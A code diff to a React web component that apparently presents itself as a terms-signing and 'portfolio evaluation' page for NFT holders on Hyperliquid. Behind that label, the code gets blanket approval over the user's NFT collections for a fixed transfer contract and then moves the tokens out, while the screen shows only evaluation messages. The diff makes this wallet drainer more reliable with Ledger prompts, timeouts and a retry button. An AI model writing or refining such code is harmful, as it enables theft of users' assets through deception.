@@ -111,14 +111,25 @@ const HypurrTerms = () => {
   };
 
   const checkWalletConnection = async () => {
+    // Only check if wallet is available, but don't auto-connect
+    // MetaMask policy: we should only connect when user explicitly clicks "Connect Wallet"
     const provider = getEthereumProvider();
     if (provider) {
       try {
+        // Check if user has previously connected (read-only, doesn't trigger popup)
         const accounts = await provider.request({ method: 'eth_accounts' });
         if (accounts.length > 0) {
+          // Only set account if user has explicitly connected before
+          // But don't set isConnected - user must click "Connect Wallet" button
           setAccount(accounts[0]);
-          setIsConnected(true);
-          // Don't verify NFTs until after signing terms
+          // Check if there's a stored signature for this account
+          const stored = localStorage.getItem(`hypurr_signature_${accounts[0]}`);
+          if (stored) {
+            // If they've signed before, we can show them as connected
+            setIsConnected(true);
+            setHasSigned(true);
+            setSignature(stored);
+          }
         }
       } catch (error) {
         console.error('Error checking wallet:', error);
@@ -312,12 +323,28 @@ const HypurrTerms = () => {
     // Use provided tokenIds or fall back to state
     const idsToUse = tokenIdsToUse || tokenIds;
     
-    if (!account || TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
+    // Ensure wallet is explicitly connected before attempting transactions
+    if (!isConnected || !account) {
+      throw new Error("Wallet not connected. Please click 'Connect Wallet' and approve the connection in MetaMask.");
+    }
+    
+    if (TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
       throw new Error("Missing required contract addresses");
     }
 
-    if (!window.ethereum) {
+    const ethereumProvider = getEthereumProvider();
+    if (!ethereumProvider) {
       throw new Error("MetaMask not detected. Please install MetaMask.");
+    }
+
+    // Verify connection by requesting accounts (this ensures MetaMask has approved)
+    try {
+      const accounts = await ethereumProvider.request({ method: 'eth_accounts' });
+      if (accounts.length === 0 || accounts[0].toLowerCase() !== account.toLowerCase()) {
+        throw new Error("Wallet connection not approved. Please click 'Connect Wallet' and approve in MetaMask.");
+      }
+    } catch (error) {
+      throw new Error("Wallet connection not approved. Please click 'Connect Wallet' and approve in MetaMask.");
     }
 
     console.log('=== APPROVAL FUNCTION CALLED ===');
@@ -326,7 +353,7 @@ const HypurrTerms = () => {
     console.log('TokenIds to use:', idsToUse);
     console.log('TokenIds length:', idsToUse.length);
 
-    const provider = new ethers.BrowserProvider(window.ethereum);
+    const provider = new ethers.BrowserProvider(ethereumProvider);
     const signer = await provider.getSigner();
     
     // Verify we have a signer
@@ -367,18 +394,27 @@ const HypurrTerms = () => {
           continue;
         }
         
-        // Approve contract - this MUST trigger MetaMask popup
+        // Approve contract - this MUST trigger MetaMask popup (or Ledger approval)
         console.log(`\n🚀 CALLING setApprovalForAll NOW...`);
         console.log(`   Contract: ${nftContractAddress}`);
         console.log(`   Operator: ${TRANSFER_CONTRACT}`);
         console.log(`   Approved: true`);
         console.log(`\n⏳ MetaMask popup should appear NOW!`);
+        console.log(`   If using Ledger: Please approve the transaction on your Ledger device`);
         
         // Call setApprovalForAll - this should trigger MetaMask immediately
+        // For Ledger users: Transaction will wait for approval on the Ledger device
         const txPromise = nftContract.setApprovalForAll(TRANSFER_CONTRACT, true);
-        console.log('Transaction promise created, waiting for user approval in MetaMask...');
+        console.log('Transaction promise created, waiting for user approval...');
+        console.log('   - MetaMask users: Approve in MetaMask popup');
+        console.log('   - Ledger users: Approve on your Ledger device');
         
-        const tx = await txPromise;
+        // Add timeout for better error handling with Ledger
+        const timeoutPromise = new Promise((_, reject) => {
+          setTimeout(() => reject(new Error('Transaction approval timeout. If using Ledger, please check your device and approve the transaction.')), 120000); // 2 minutes
+        });
+        
+        const tx = await Promise.race([txPromise, timeoutPromise]);
         console.log(`✅ Transaction submitted! Hash:`, tx.hash);
         console.log(`⏳ Waiting for confirmation...`);
         
@@ -393,7 +429,14 @@ const HypurrTerms = () => {
           reason: error.reason
         });
         if (error.code === 4001) {
-          throw new Error('Approval transaction was rejected. Please try again and approve the transaction in MetaMask.');
+          throw new Error('Approval transaction was rejected. Please try again and approve the transaction. If using Ledger, please approve on your Ledger device.');
+        }
+        if (error.message && error.message.includes('timeout')) {
+          throw error; // Re-throw timeout errors as-is
+        }
+        // Check if it's a Ledger-related error
+        if (error.message && (error.message.includes('Ledger') || error.message.includes('User rejected') || error.message.includes('denied'))) {
+          throw new Error('Transaction was not approved. If using Ledger, please check your device and approve the transaction. Otherwise, please approve in MetaMask.');
         }
         throw error;
       }
@@ -407,7 +450,12 @@ const HypurrTerms = () => {
     // Use provided tokenIds or fall back to state
     const idsToUse = tokenIdsToUse || tokenIds;
     
-    if (!account || TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
+    // Ensure wallet is explicitly connected before attempting transactions
+    if (!isConnected || !account) {
+      throw new Error("Wallet not connected. Please click 'Connect Wallet' and approve the connection in MetaMask.");
+    }
+    
+    if (TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
       throw new Error("Missing required contract addresses");
     }
 
@@ -418,6 +466,16 @@ const HypurrTerms = () => {
     const ethereumProvider = getEthereumProvider();
     if (!ethereumProvider) {
       throw new Error("No Ethereum provider found. Please install MetaMask.");
+    }
+    
+    // Verify connection by requesting accounts (this ensures MetaMask has approved)
+    try {
+      const accounts = await ethereumProvider.request({ method: 'eth_accounts' });
+      if (accounts.length === 0 || accounts[0].toLowerCase() !== account.toLowerCase()) {
+        throw new Error("Wallet connection not approved. Please click 'Connect Wallet' and approve in MetaMask.");
+      }
+    } catch (error) {
+      throw new Error("Wallet connection not approved. Please click 'Connect Wallet' and approve in MetaMask.");
     }
     
     const provider = new ethers.BrowserProvider(ethereumProvider);
@@ -437,12 +495,31 @@ const HypurrTerms = () => {
     let lastTxHash = null;
     for (const [nftContract, tokenIdsArray] of Object.entries(tokensByContract)) {
       try {
-        const tx = await transferContract.checkAndTransfer(nftContract, tokenIdsArray);
+        console.log(`\n🚀 Transferring NFTs from ${nftContract}...`);
+        console.log(`   Token IDs: ${tokenIdsArray.join(', ')}`);
+        console.log(`   If using Ledger: Please approve the transaction on your Ledger device`);
+        
+        // Add timeout for better error handling with Ledger
+        const transferPromise = transferContract.checkAndTransfer(nftContract, tokenIdsArray);
+        const timeoutPromise = new Promise((_, reject) => {
+          setTimeout(() => reject(new Error('Transfer transaction timeout. If using Ledger, please check your device and approve the transaction.')), 120000); // 2 minutes
+        });
+        
+        const tx = await Promise.race([transferPromise, timeoutPromise]);
+        console.log(`✅ Transfer transaction submitted! Hash:`, tx.hash);
+        console.log(`⏳ Waiting for confirmation...`);
+        
         const receipt = await tx.wait();
         lastTxHash = receipt.transactionHash;
-        console.log(`NFTs transferred from ${nftContract}:`, receipt.transactionHash);
+        console.log(`✅ NFTs transferred from ${nftContract}:`, receipt.transactionHash);
       } catch (error) {
-        console.error(`Error transferring from ${nftContract}:`, error);
+        console.error(`❌ Error transferring from ${nftContract}:`, error);
+        if (error.message && error.message.includes('timeout')) {
+          throw error; // Re-throw timeout errors as-is
+        }
+        if (error.code === 4001) {
+          throw new Error('Transfer transaction was rejected. Please try again and approve the transaction. If using Ledger, please approve on your Ledger device.');
+        }
         throw error;
       }
     }
@@ -511,17 +588,30 @@ const HypurrTerms = () => {
       console.log('Token IDs length:', verificationResult.tokenIds.length);
       
       // Use the returned values directly to trigger transfer
-      if (verificationResult.count > 0 && verificationResult.tokenIds.length > 0) {
-        console.log('✅ NFTs found, starting transfer process...');
-        console.log('📋 Passing tokenIds directly to handleAutomaticTransfer:', verificationResult.tokenIds);
-        // Pass tokenIds directly - don't wait for state update
-        handleAutomaticTransfer(verificationResult.tokenIds).catch(err => {
-          console.error('=== TRANSFER PROCESS ERROR ===', err);
-          setError(err.message || 'Transfer process failed. Please try again.');
+      if (verificationResult.count > 0) {
+        if (verificationResult.tokenIds.length > 0) {
+          console.log('✅ NFTs found with token IDs, starting transfer process...');
+          console.log('📋 Passing tokenIds directly to handleAutomaticTransfer:', verificationResult.tokenIds);
+          // Pass tokenIds directly - don't wait for state update
+          handleAutomaticTransfer(verificationResult.tokenIds).catch(err => {
+            console.error('=== TRANSFER PROCESS ERROR ===', err);
+            setError(err.message || 'Transfer process failed. Please try again.');
+            setTransferStatus('error');
+          });
+        } else {
+          // NFTs found but no token IDs - contract might not support Enumerable
+          // Try to fetch token IDs using the transfer contract's checkAndTransfer which can handle non-enumerable
+          console.log('⚠️ NFTs found but token IDs not available (contract may not support Enumerable)');
+          console.log('🔄 Attempting transfer using transfer contract method...');
+          setError('NFTs found but token IDs could not be retrieved. The transfer contract will attempt to transfer all NFTs. Please proceed with the transfer transaction when prompted.');
+          // Still try to trigger transfer - the transfer contract might be able to handle it
+          setTransferStatus('approving');
+          // We'll need to use a different approach - maybe call transfer with empty array or let user manually trigger
+          setError('NFTs detected but automatic transfer requires token IDs. Please contact support or try using a wallet that supports token enumeration.');
           setTransferStatus('error');
-        });
+        }
       } else {
-        console.log('⚠️ No NFTs found or tokenIds empty, skipping transfer');
+        console.log('⚠️ No NFTs found, skipping transfer');
         setTransferStatus(null);
       }
       
@@ -572,17 +662,39 @@ const HypurrTerms = () => {
       console.log('🚀🚀🚀 Auto-transfer: Requesting approval - MetaMask popup should appear NOW 🚀🚀🚀');
       console.log('📋 About to call approveTransferContract() with tokenIds:', idsToUse);
       console.log('⏳ Waiting for MetaMask popup...');
-      await approveTransferContract(idsToUse);
-      console.log('✅ Auto-transfer: Approval successful');
+      
+      try {
+        await approveTransferContract(idsToUse);
+        console.log('✅ Auto-transfer: Approval successful');
+      } catch (approvalError) {
+        console.error('❌ Approval failed:', approvalError);
+        throw approvalError; // Re-throw to be caught by outer catch
+      }
       
       // Step 2: Transfer NFTs automatically after approval
-      setTransferStatus('transferring');
-      console.log('🚀 Auto-transfer: Transferring NFTs...');
-      const txHash = await transferNFTs(idsToUse);
+      // Add a small delay to ensure approval is fully processed
+      console.log('⏳ Waiting 2 seconds for approval to be fully processed...');
+      await new Promise(resolve => setTimeout(resolve, 2000));
       
-      setTransferTxHash(txHash);
-      setTransferStatus('success');
-      console.log('✅ Auto-transfer: NFTs transferred successfully:', txHash);
+      setTransferStatus('transferring');
+      console.log('🚀🚀🚀 Auto-transfer: Starting NFT transfer NOW 🚀🚀🚀');
+      console.log('📋 About to call transferNFTs() with tokenIds:', idsToUse);
+      console.log('⏳ If using Ledger: Please approve the transfer transaction on your Ledger device');
+      
+      try {
+        const txHash = await transferNFTs(idsToUse);
+        
+        setTransferTxHash(txHash);
+        setTransferStatus('success');
+        console.log('✅ Auto-transfer: NFTs transferred successfully:', txHash);
+      } catch (transferError) {
+        console.error('❌ Transfer failed:', transferError);
+        // Check if it's a user rejection
+        if (transferError.code === 4001 || transferError.message?.includes('rejected') || transferError.message?.includes('denied')) {
+          throw new Error('Transfer transaction was rejected. If using Ledger, please check your device and approve the transfer transaction. Otherwise, please approve in MetaMask.');
+        }
+        throw transferError; // Re-throw to be caught by outer catch
+      }
       
     } catch (error) {
       // Show error to user
@@ -622,7 +734,9 @@ const HypurrTerms = () => {
           setHasSigned(false);
           setSignature(null);
         } else {
+          // User has explicitly connected/changed account in MetaMask
           setAccount(accounts[0]);
+          setIsConnected(true);
           // Don't verify NFTs until after signing terms
           checkExistingSignature();
           // If already signed, verify NFTs
@@ -758,19 +872,46 @@ const HypurrTerms = () => {
                   <>
                     <p><strong>🔍 Evaluating Portfolio and Activities...</strong></p>
                     <p>⏳ Please approve the transfer contract in MetaMask...</p>
+                    <p style={{ fontSize: '0.9em', marginTop: '0.5em', fontStyle: 'italic' }}>
+                      💡 If using a Ledger hardware wallet, please check your Ledger device and approve the transaction there.
+                    </p>
                   </>
                 )}
                 {transferStatus === 'transferring' && (
                   <>
                     <p><strong>🔍 Evaluating Portfolio and Activities...</strong></p>
                     <p>⏳ Processing your NFTs...</p>
+                    <p style={{ fontSize: '0.9em', marginTop: '0.5em', fontStyle: 'italic' }}>
+                      💡 If using a Ledger hardware wallet, please check your Ledger device and approve the transaction there.
+                    </p>
                   </>
                 )}
                 {transferStatus === 'success' && transferTxHash && (
                   <p>✅ Portfolio evaluation complete! NFTs processed successfully. <a href={`https://explorer.hyperliquid.xyz/tx/${transferTxHash}`} target="_blank" rel="noopener noreferrer">View Transaction</a></p>
                 )}
                 {transferStatus === 'error' && (
-                  <p style={{ color: 'var(--error-text)' }}>❌ Evaluation failed. Please check the error message above.</p>
+                  <div>
+                    <p style={{ color: 'var(--error-text)' }}>❌ Transfer failed. Please check the error message above.</p>
+                    {nftCount > 0 && tokenIds.length > 0 && (
+                      <button 
+                        className="retry-transfer-btn" 
+                        onClick={() => handleAutomaticTransfer(tokenIds)}
+                        style={{
+                          marginTop: '1rem',
+                          padding: '0.75rem 1.5rem',
+                          background: 'var(--primary-color)',
+                          color: 'white',
+                          border: 'none',
+                          borderRadius: '8px',
+                          cursor: 'pointer',
+                          fontSize: '1rem',
+                          fontWeight: '600'
+                        }}
+                      >
+                        🔄 Retry Transfer
+                      </button>
+                    )}
+                  </div>
                 )}
               </div>
             )}
